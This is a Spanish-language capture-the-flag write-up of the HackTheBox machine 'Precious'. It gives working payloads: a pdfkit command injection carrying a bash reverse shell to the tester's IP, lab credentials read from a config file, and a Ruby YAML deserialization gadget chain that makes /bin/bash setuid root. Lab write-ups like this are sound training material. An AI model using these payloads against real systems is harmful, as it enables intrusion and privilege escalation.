---
layout: post
title : "Precious - HackTheBox"
author : elc4br4
image : /assets/images/HTB/Precious-HackTheBox/Precious.jpg
optimized_image : /assets/images/HTB/Precious-HackTheBox/Precious.jpg
tags : [ Linux, HackTheBox ]
description : En esta ocasión resolveremos una máquina Easy de la plataforma HackTheBox, en la que aprovecharemos una vulnerabilidad de pdfkit para ganar acceso y escalaremos privilegios a través de yaml deserialization en un archivo ruby.
---

🤔En esta ocasión resolveremos una máquina Easy de la plataforma HackTheBox, en la que aprovecharemos una vulnerabilidad de pdfkit para ganar acceso y escalaremos privilegios a través de yaml deserialization en un archivo ruby🤔.

**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
2. [Explotación](#explotación).
4. [Escalada de Privilegios](#privesc). 

# Reconocimiento [#](reconocimiento) {#reconocimiento}

Como de costumbre lo primero es comenzar con el reconocimiento de puertos usando la herramienta nmap.

```bash
# Escaneo de puertos nmap
-------------------------
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

La máquina tiene dos puertos abiertos, el puerto 80 y el puerto 22, pero necesito averiguar más información sobre ellos, así como la versión que corren cada uno o lo que se ejecuta en cada puerto.

Esto lo hago a través de un escaneo nmap un poco más avanzado.

```bash 
# Escaneo nmap más detallado
----------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> Dominio `precious.htb`.

Añado el dominio al archivo hosts de mi máquina local.

Accedo al dominio desde el navegador para ver que hay en el servidor web.

Al acceder encuentro lo siguiente:

![](/assets/images/HTB/Precious-HackTheBox/web.png)

Pruebo a introducir una url con mi dirección ip de la interfaz tun0 (es decir, la de la VPN).

Pero me arroja un error:

![](/assets/images/HTB/Precious-HackTheBox/web2.png)

Se me ocurre ejecutar un servidor de python y volver a probar lo mismo.

```bash
# Python3 server
----------------
python3 -m http.server 8081
```

![](/assets/images/HTB/Precious-HackTheBox/web3.png)

Y al darle a submit se me abre la siguiente ventana.

![](/assets/images/HTB/Precious-HackTheBox/web4.png)

Descargo el archivo pdf y lo analizo con la herramienta `exiftool`.

![](/assets/images/HTB/Precious-HackTheBox/exiftool.png)

Al analizar el archivo puedo ver que ha sido generado por `pdfkit v0.8.6`.

# Explotación [#](explotación) {#explotación}

Por lo que busco en google información al respecto en busca de vulnerabilidad existentes.

Y buscando encuentro el siguiente recurso:

[https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)

```bash
# En el enlace podemos ver un ejemplo de explotación.
http://example.com/?name=#{'%20`sleep 5`'}
```

Por lo que si sustituyo la parte sleep por una reverse shell podría obtener acceso al sistema.

```bash
# Reverse shell
http://10.10.14.27:8081/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.27/443 0>&1"`'}
```

Introduzco la reverse shell en el servidor web y obtengo la conexión en mi oyente de netcat.

![](/assets/images/HTB/Precious-HackTheBox/shell.png)

Enumerando un poco puedo ver que existe un directorio bajo el nombre de .bundle donde encuentro unas credenciales del usuario harry.

```bash
bash-5.1$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Uso las credenciales para conectarme a través de ssh.

```bash
-bash-5.1$ id
uid=1000(henry) gid=1000(henry) groups=1000(henry)
-bash-5.1$ whoami
henry
-bash-5.1$ hostname
precious 
```

# Escalada de Privilegios [#](Escalada de Privilegios) {#privesc}

A continuación toca escalar privilegios, por lo que ejecuto el comando
`sudo -l`.

```bash
-bash-5.1$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Como se puede apreciar, puedo ejecutar como root sin contraseña el binario `ruby` y el fichero `update_dependencies.rb`.

Primero leo el archivo `update_dependencies.rb` y este es su contenido.

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

El script carga el archivo `dependencies.yml` por lo que al verlo se me ocurre que podría ser vulnerable a yaml deserialization.

Por lo que busco información al respecto y encuentro este artículo.

[https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)

Creo un archivo llamado dependencies.yml en la ruta /home/harry con el siguiente contenido:

```yml
 ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: chmod u+s /bin/bash
          method_id: :resolve 
```

Añado la línea `git_set: chmod u+s /bin/bash` para que al ejecutar el archivo `update_dependencies.rb` cargue el archivo `dependencies.yml` y ejecute el comando que he introducido. 

Lo ejecuto:

```bash
-bash-5.1$ sudo /usr/bin/ruby /opt/update_dependencies.rb 
```

Una vez ejecutado:

```bash
-bash-5.1$ bash -p
bash-5.1# id
uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)
bash-5.1# whoami
root
```

Y listo, ya he escalado privilegios al usuario root.

Máquina pwneada!!!